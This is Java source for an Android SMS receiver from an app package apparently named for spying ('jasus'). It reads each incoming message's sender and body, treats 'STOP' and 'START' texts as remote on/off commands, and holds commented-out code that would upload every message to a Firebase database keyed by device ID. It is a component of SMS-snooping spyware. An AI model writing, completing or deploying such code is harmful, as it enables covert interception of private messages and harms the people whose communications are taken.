package com.perry.jasus.BroadcastServices;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.perry.jasus.Util.LocalData;

import java.util.Calendar;
import java.util.Date;

public class IncomingSms extends IncomingCall {

    public void onReceive(Context context, Intent intent) {
        String deviceID = LocalData.getDeviceID();
        DatabaseReference reference = FirebaseDatabase.getInstance().getReference().child("Users").child(deviceID).child("Sms");

        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();
                    Date currentTime = Calendar.getInstance().getTime();
                    String time = String.valueOf(currentTime);
                    String senderNum = phoneNumber;
                    String message = currentMessage.getDisplayMessageBody();

                    SharedPreferences preferences = context.getSharedPreferences("APP", Context.MODE_PRIVATE);
                    SharedPreferences.Editor editor = preferences.edit();

                    if (message.equals("STOP")) {

                        editor.putString("app", "stop");
                        editor.commit();

                        Toast.makeText(context, "bom save", Toast.LENGTH_SHORT).show();
                    }

                    if (message.equals("START")) {
                        editor.putString("app", "start");
                        editor.commit();
                        Toast.makeText(context, "bom save", Toast.LENGTH_SHORT).show();
                    }


                    // Show Alert
                    int duration = Toast.LENGTH_LONG;
                    Toast toast = Toast.makeText(context, "Working " + "Sender Num : " + senderNum + ", Msg: " + message + ",currentTime :", duration);
                    toast.show();

//                    SMS_Model model = new SMS_Model(senderNum, message, time);
//                    String key = reference.push().getKey();
//
//                    reference.child(key).setValue(model).addOnSuccessListener(new OnSuccessListener<Void>() {
//                        @Override
//                        public void onSuccess(Void unused) {
//                            Toast.makeText(context, "Done", Toast.LENGTH_SHORT).show();
//                        }
//                    }).addOnFailureListener(new OnFailureListener() {
//                        @Override
//                        public void onFailure(@NonNull Exception e) {
//                            Toast.makeText(context, e.toString(), Toast.LENGTH_SHORT).show();
//                            Log.d("Pd", "onFailure: " + e.toString());
//                        }
//                    });

                }
            }

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" + e);

        }


    }


}
